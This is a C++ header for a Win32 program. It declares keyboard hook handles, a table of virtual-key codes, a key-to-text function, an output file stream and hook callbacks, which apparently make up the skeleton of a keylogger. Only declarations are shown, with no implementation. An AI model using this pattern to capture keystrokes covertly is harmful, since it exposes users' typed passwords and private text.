#pragma once

#include "resource.h"
#include <fstream>
#include <string>

using namespace std;

#define MAX_LOADSTRING 100
// Global Variables:
HINSTANCE hInst;                                // current instance
HINSTANCE hInstHook, hInstHook1;
HWND main;

WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

HHOOK hHook = NULL;
HHOOK hHook1 = NULL;

int k = 0, state = 0;
unsigned int nlist[] = { 48, 49, 50, 51, 52, 53, 54, 55, 56, 57,
65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90,
VK_SPACE, VK_RETURN, VK_TAB, VK_BACK, VK_CAPITAL, VK_SHIFT, VK_CONTROL, VK_RETURN, VK_MENU,
VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9,
VK_MULTIPLY, VK_ADD, VK_SEPARATOR, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE,
0
};

CHAR* KeyToBuff(unsigned int i);

ofstream output;

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK KeyHookProc1(int nCode, WPARAM wParam, LPARAM lParam);